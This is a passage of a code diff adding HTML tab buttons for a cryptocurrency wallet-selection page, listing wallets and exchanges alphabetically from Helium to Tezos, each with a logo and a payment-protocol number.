+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Helium-tab" data-bs-toggle="pill" data-bs-target="#pills-Helium" data-payment-protocol="40" data-wallet-name="Helium" data-wallet-logo="assets/img/wallets/helium.png" type="button" role="tab" aria-controls="pills-Helium" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/helium.png" width="50"></span>
+                <span class="h6 fw-bold">Helium</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Huobi -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Huobi-tab" data-bs-toggle="pill" data-bs-target="#pills-Huobi" data-payment-protocol="41" data-wallet-name="Huobi" data-wallet-logo="assets/img/wallets/huobi.jfif" type="button" role="tab" aria-controls="pills-Huobi" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/huobi.jfif" width="50"></span>
+                <span class="h6 fw-bold">Huobi</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- imToken -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-imToken-tab" data-bs-toggle="pill" data-bs-target="#pills-imToken" data-payment-protocol="42" data-wallet-name="imToken" data-wallet-logo="assets/img/wallets/imtoken.jfif" type="button" role="tab" aria-controls="pills-imToken" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/imtoken.jfif" width="50"></span>
+                <span class="h6 fw-bold">imToken</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Infinity -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Infinity-tab" data-bs-toggle="pill" data-bs-target="#pills-Infinity" data-payment-protocol="43" data-wallet-name="Infinity" data-wallet-logo="assets/img/wallets/infinity.jfif" type="button" role="tab" aria-controls="pills-Infinity" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/infinity.jfif" width="50"></span>
+                <span class="h6 fw-bold">Infinity</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Jupiter -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Jupiter-tab" data-bs-toggle="pill" data-bs-target="#pills-Jupiter" data-payment-protocol="44" data-wallet-name="Jupiter" data-wallet-logo="assets/img/wallets/jupiter.jfif" type="button" role="tab" aria-controls="pills-Jupiter" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/jupiter.jfif" width="50"></span>
+                <span class="h6 fw-bold">Jupiter</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Kaspium -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Kaspium-tab" data-bs-toggle="pill" data-bs-target="#pills-Kaspium" data-payment-protocol="45" data-wallet-name="Kaspium" data-wallet-logo="assets/img/wallets/kaspium.webp" type="button" role="tab" aria-controls="pills-Kaspium" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/kaspium.webp" width="50"></span>
+                <span class="h6 fw-bold">Kaspium</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- KeepKey -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-KeepKey-tab" data-bs-toggle="pill" data-bs-target="#pills-KeepKey" data-payment-protocol="46" data-wallet-name="KeepKey" data-wallet-logo="assets/img/wallets/keepkey.jfif" type="button" role="tab" aria-controls="pills-KeepKey" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/keepkey.jfif" width="50"></span>
+                <span class="h6 fw-bold">KeepKey</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Keplr -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Keplr-tab" data-bs-toggle="pill" data-bs-target="#pills-Keplr" data-payment-protocol="47" data-wallet-name="Keplr" data-wallet-logo="assets/img/wallets/eplr.jfif" type="button" role="tab" aria-controls="pills-Keplr" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/eplr.jfif" width="50"></span>
+                <span class="h6 fw-bold">Keplr</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Keystone -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Keystone-tab" data-bs-toggle="pill" data-bs-target="#pills-Keystone" data-payment-protocol="48" data-wallet-name="Keystone" data-wallet-logo="assets/img/wallets/keystone.jfif" type="button" role="tab" aria-controls="pills-Keystone" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/keystone.jfif" width="50"></span>
+                <span class="h6 fw-bold">Keystone</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Klever -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Klever-tab" data-bs-toggle="pill" data-bs-target="#pills-Klever" data-payment-protocol="49" data-wallet-name="Klever" data-wallet-logo="assets/img/wallets/klever.png" type="button" role="tab" aria-controls="pills-Klever" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/klever.png" width="50"></span>
+                <span class="h6 fw-bold">Klever</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Komodo -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-komodo-tab" data-bs-toggle="pill" data-bs-target="#pills-komodo" data-payment-protocol="50" data-wallet-name="Komodo" data-wallet-logo="assets/img/wallets/komodo.png" type="button" role="tab" aria-controls="pills-komodo" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/komodo.png" width="50"></span>
+                <span class="h6 fw-bold">Komodo</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Kraken -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Kraken-tab" data-bs-toggle="pill" data-bs-target="#pills-Kraken" data-payment-protocol="51" data-wallet-name="Kraken" data-wallet-logo="assets/img/wallets/kraken.jfif" type="button" role="tab" aria-controls="pills-Kraken" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/kraken.jfif" width="50"></span>
+                <span class="h6 fw-bold">Kraken</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Leap -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Leap-tab" data-bs-toggle="pill" data-bs-target="#pills-Leap" data-payment-protocol="52" data-wallet-name="Leap" data-wallet-logo="assets/img/wallets/leap.jfif" type="button" role="tab" aria-controls="pills-Leap" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/leap.jfif" width="50"></span>
+                <span class="h6 fw-bold">Leap</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Leo Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-leo-tab" data-bs-toggle="pill" data-bs-target="#pills-leo" data-payment-protocol="53" data-wallet-name="Leo Wallet" data-wallet-logo="assets/img/wallets/leo.png" type="button" role="tab" aria-controls="pills-leo" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/leo.png" width="50"></span>
+                <span class="h6 fw-bold">Leo Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Lobstr -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Lobstr-tab" data-bs-toggle="pill" data-bs-target="#pills-Lobstr" data-payment-protocol="54" data-wallet-name="Lobstr" data-wallet-logo="assets/img/wallets/lobstr.jfif" type="button" role="tab" aria-controls="pills-Lobstr" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/lobstr.jfif" width="50"></span>
+                <span class="h6 fw-bold">Lobstr</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Loopring (First Instance) -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Loopring1-tab" data-bs-toggle="pill" data-bs-target="#pills-Loopring1" data-payment-protocol="55" data-wallet-name="Loopring" data-wallet-logo="assets/img/wallets/loopring.jfif" type="button" role="tab" aria-controls="pills-Loopring1" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/loopring.jfif" width="50"></span>
+                <span class="h6 fw-bold">Loopring</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Loopring (Second Instance) -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Loopring2-tab" data-bs-toggle="pill" data-bs-target="#pills-Loopring2" data-payment-protocol="56" data-wallet-name="Loopring" data-wallet-logo="assets/img/wallets/loopring.png" type="button" role="tab" aria-controls="pills-Loopring2" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/loopring.png" width="50"></span>
+                <span class="h6 fw-bold">Loopring</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Math Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-math-tab" data-bs-toggle="pill" data-bs-target="#pills-math" data-payment-protocol="57" data-wallet-name="Math" data-wallet-logo="assets/img/wallets/math.jfif" type="button" role="tab" aria-controls="pills-math" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/math.jfif" width="50"></span>
+                <span class="h6 fw-bold">Math Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Monero GUI -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-MoneroGUI-tab" data-bs-toggle="pill" data-bs-target="#pills-MoneroGUI" data-payment-protocol="58" data-wallet-name="Monero GUI" data-wallet-logo="assets/img/wallets/monero.png" type="button" role="tab" aria-controls="pills-MoneroGUI" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/monero.png" width="50"></span>
+                <span class="h6 fw-bold">Monero GUI</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Monerujo -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Monerujo-tab" data-bs-toggle="pill" data-bs-target="#pills-Monerujo" data-payment-protocol="59" data-wallet-name="Monerujo" data-wallet-logo="assets/img/wallets/monerujo.jfif" type="button" role="tab" aria-controls="pills-Monerujo" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/monerujo.jfif" width="50"></span>
+                <span class="h6 fw-bold">Monerujo</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Mydoge -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-mydoge-tab" data-bs-toggle="pill" data-bs-target="#pills-mydoge" data-payment-protocol="60" data-wallet-name="Mydoge" data-wallet-logo="assets/img/wallets/mydoge.jfif" type="button" role="tab" aria-controls="pills-Mydoge" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/mydoge.jfif" width="50"></span>
+                <span class="h6 fw-bold">Mydoge</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Mycelium -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Mycelium-tab" data-bs-toggle="pill" data-bs-target="#pills-Mycelium" data-payment-protocol="61" data-wallet-name="Mycelium" data-wallet-logo="assets/img/wallets/mycelium.jfif" type="button" role="tab" aria-controls="pills-Mycelium" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/mycelium.jfif" width="50"></span>
+                <span class="h6 fw-bold">Mycelium</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Myether Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-MyetherWallet-tab" data-bs-toggle="pill" data-bs-target="#pills-MyetherWallet" data-payment-protocol="62" data-wallet-name="Myether Wallet" data-wallet-logo="assets/img/wallets/myether.jfif" type="button" role="tab" aria-controls="pills-MyetherWallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/myether.jfif" width="50"></span>
+                <span class="h6 fw-bold">Myether Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Mymonero -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Mymonero-tab" data-bs-toggle="pill" data-bs-target="#pills-Mymonero" data-payment-protocol="63" data-wallet-name="Mymonero" data-wallet-logo="assets/img/wallets/mymonero.jfif" type="button" role="tab" aria-controls="pills-Mymonero" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/mymonero.jfif" width="50"></span>
+                <span class="h6 fw-bold">Mymonero</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Myton -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Myton-tab" data-bs-toggle="pill" data-bs-target="#pills-Myton" data-payment-protocol="64" data-wallet-name="Myton" data-wallet-logo="assets/img/wallets/myton.jfif" type="button" role="tab" aria-controls="pills-Myton" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/myton.jfif" width="50"></span>
+                <span class="h6 fw-bold">Myton</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Near -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-near-tab" data-bs-toggle="pill" data-bs-target="#pills-near" data-payment-protocol="65" data-wallet-name="Near" data-wallet-logo="assets/img/wallets/near.png" type="button" role="tab" aria-controls="pills-near" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/near.png" width="50"></span>
+                <span class="h6 fw-bold">Near</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Neon -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-neon-tab" data-bs-toggle="pill" data-bs-target="#pills-neon" data-payment-protocol="66" data-wallet-name="Neon" data-wallet-logo="assets/img/wallets/neon.png" type="button" role="tab" aria-controls="pills-Neon" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/neon.png" width="50"></span>
+                <span class="h6 fw-bold">Neon</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Nova -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Nova-tab" data-bs-toggle="pill" data-bs-target="#pills-Nova" data-payment-protocol="67" data-wallet-name="Nova" data-wallet-logo="assets/img/wallets/nova.jfif" type="button" role="tab" aria-controls="pills-Nova" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/nova.jfif" width="50"></span>
+                <span class="h6 fw-bold">Nova</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Nunchuk -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-nunchuk-tab" data-bs-toggle="pill" data-bs-target="#pills-nunchuk" data-payment-protocol="68" data-wallet-name="Nunchuk" data-wallet-logo="assets/img/wallets/nunchuk.png" type="button" role="tab" aria-controls="pills-nunchuk" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/nunchuk.png" width="50"></span>
+                <span class="h6 fw-bold">Nunchuk</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- OKX -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-okx-tab" data-bs-toggle="pill" data-bs-target="#pills-okx" data-payment-protocol="69" data-wallet-name="OKX" data-wallet-logo="assets/img/wallets/okx.jfif" type="button" role="tab" aria-controls="pills-okx" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/okx.jfif" width="50"></span>
+                <span class="h6 fw-bold">OKX</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- OneKey -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-OneKey-tab" data-bs-toggle="pill" data-bs-target="#pills-OneKey" data-payment-protocol="70" data-wallet-name="OneKey" data-wallet-logo="assets/img/wallets/onekey.png" type="button" role="tab" aria-controls="pills-OneKey" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/onekey.png" width="50"></span>
+                <span class="h6 fw-bold">OneKey</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Onto -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-onto-tab" data-bs-toggle="pill" data-bs-target="#pills-onto" data-payment-protocol="71" data-wallet-name="Onto" data-wallet-logo="assets/img/wallets/onto.png" type="button" role="tab" aria-controls="pills-onto" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/onto.png" width="50"></span>
+                <span class="h6 fw-bold">Onto</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Pera Algo -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-PeraAlgo-tab" data-bs-toggle="pill" data-bs-target="#pills-PeraAlgo" data-payment-protocol="72" data-wallet-name="Pera Algo" data-wallet-logo="assets/img/wallets/pera.png" type="button" role="tab" aria-controls="pills-PeraAlgo" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/pera.png" width="50"></span>
+                <span class="h6 fw-bold">Pera Algo</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Phantom -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Phantom-tab" data-bs-toggle="pill" data-bs-target="#pills-Phantom" data-payment-protocol="73" data-wallet-name="Phantom" data-wallet-logo="assets/img/wallets/phantom.png" type="button" role="tab" aria-controls="pills-Phantom" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/phantom.png" width="50"></span>
+                <span class="h6 fw-bold">Phantom</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Rabby Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-rabby-tab" data-bs-toggle="pill" data-bs-target="#pills-rabby" data-payment-protocol="7" data-wallet-name="Rabby Wallet" data-wallet-logo="assets/img/wallets/rabby.jfif" type="button" role="tab" aria-controls="pills-rabby" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/rabby.jfif" width="50"></span>
+            <span class="h6 fw-bold">Rabby Wallet</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Robinhood -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Robinhood-tab" data-bs-toggle="pill" data-bs-target="#pills-Robinhood" data-payment-protocol="7" data-wallet-name="Robinhood" data-wallet-logo="assets/img/wallets/robinhood.jpg" type="button" role="tab" aria-controls="pills-Robinhood" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/robinhood.jpg" width="50"></span>
+            <span class="h6 fw-bold">Robinhood</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- RockWallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-rock-tab" data-bs-toggle="pill" data-bs-target="#pills-rock" data-payment-protocol="7" data-wallet-name="RockWallet" data-wallet-logo="assets/img/wallets/rock.png" type="button" role="tab" aria-controls="pills-rock" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/rock.png" width="50"></span>
+            <span class="h6 fw-bold">RockWallet</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Ronin -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ronin-tab" data-bs-toggle="pill" data-bs-target="#pills-Ronin" data-payment-protocol="7" data-wallet-name="Ronin" data-wallet-logo="assets/img/wallets/ronin.jpg" type="button" role="tab" aria-controls="pills-Ronin" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/ronin.jpg" width="50"></span>
+            <span class="h6 fw-bold">Ronin</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Safe{Wallet} -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Safe{Wallet}-tab" data-bs-toggle="pill" data-bs-target="#pills-Safe{Wallet}" data-payment-protocol="9" data-wallet-name="Safe{Wallet}" data-wallet-logo="assets/img/wallets/safe.png" type="button" role="tab" aria-controls="pills-Safe{Wallet}" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/safe.png" width="50"></span>
+            <span class="h6 fw-bold">Safe{Wallet}</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Safemoon -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Safemoon-tab" data-bs-toggle="pill" data-bs-target="#pills-Safemoon" data-payment-protocol="7" data-wallet-name="Safemoon" data-wallet-logo="assets/img/wallets/safemoon.png" type="button" role="tab" aria-controls="pills-Safemoon" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/safemoon.png" width="50"></span>
+            <span class="h6 fw-bold">Safemoon</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Safepal -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Safepal-tab" data-bs-toggle="pill" data-bs-target="#pills-Safepal" data-payment-protocol="5" data-wallet-name="Safepal" data-wallet-logo="assets/img/wallets/safepal.jpg" type="button" role="tab" aria-controls="pills-safepal" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/safepal.jpg" width="50"></span>
+            <span class="h6 fw-bold">Safepal</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Simplehold -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Simplehold-tab" data-bs-toggle="pill" data-bs-target="#pills-Simplehold" data-payment-protocol="7" data-wallet-name="Simplehold" data-wallet-logo="assets/img/wallets/simplehold.jfif" type="button" role="tab" aria-controls="pills-Simplehold" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/simplehold.jfif" width="50"></span>
+            <span class="h6 fw-bold">Simplehold</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Solar -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Solar-tab" data-bs-toggle="pill" data-bs-target="#pills-Solar" data-payment-protocol="7" data-wallet-name="Solar" data-wallet-logo="assets/img/wallets/solar.jpg" type="button" role="tab" aria-controls="pills-Solar" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/solar.jpg" width="50"></span>
+            <span class="h6 fw-bold">Solar</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Solflare -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Solflare-tab" data-bs-toggle="pill" data-bs-target="#pills-Solflare" data-payment-protocol="8" data-wallet-name="Solflare" data-wallet-logo="assets/img/wallets/solfare.jpg" type="button" role="tab" aria-controls="pills-Solflare" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/solfare.jpg" width="50"></span>
+            <span class="h6 fw-bold">Solflare</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Staked Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Staked Wallet-tab" data-bs-toggle="pill" data-bs-target="#pills-Staked Wallet" data-payment-protocol="7" data-wallet-name="Staked Wallet" data-wallet-logo="assets/img/wallets/stakedwallet.jfif" type="button" role="tab" aria-controls="pills-Staked Wallet" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/stakedwallet.jfif" width="50"></span>
+            <span class="h6 fw-bold">Staked Wallet</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Sui Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-sui-tab" data-bs-toggle="pill" data-bs-target="#pills-sui" data-payment-protocol="7" data-wallet-name="Sui Wallet" data-wallet-logo="assets/img/wallets/sui.png" type="button" role="tab" aria-controls="pills-sui" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/sui.png" width="50"></span>
+            <span class="h6 fw-bold">Sui Wallet</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Tangem -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Tangem-tab" data-bs-toggle="pill" data-bs-target="#pills-Tangem" data-payment-protocol="7" data-wallet-name="Tangem" data-wallet-logo="assets/img/wallets/tangem.png" type="button" role="tab" aria-controls="pills-Tangem" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/tangem.png" width="50"></span>
+            <span class="h6 fw-bold">Tangem</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Terra Station -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Terra Station-tab" data-bs-toggle="pill" data-bs-target="#pills-Terra Station" data-payment-protocol="7" data-wallet-name="Terra Station" data-wallet-logo="assets/img/wallets/terra.png" type="button" role="tab" aria-controls="pills-Terra Station" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/terra.png" width="50"></span>
+            <span class="h6 fw-bold">Terra Station</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Tezos -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Tezos-tab" data-bs-toggle="pill" data-bs-target="#pills-Tezos" data-payment-protocol="7" data-wallet-name="Tezos" data-wallet-logo="assets/img/wallets/tz.jfif" type="button" role="tab" aria-controls="pills-Tezos" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/tz.jfif" width="50"></span>
+            <span class="h6 fw-bold">Tezos</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Ton Keeper -->
+                        <li class="nav-item" role="presentation">
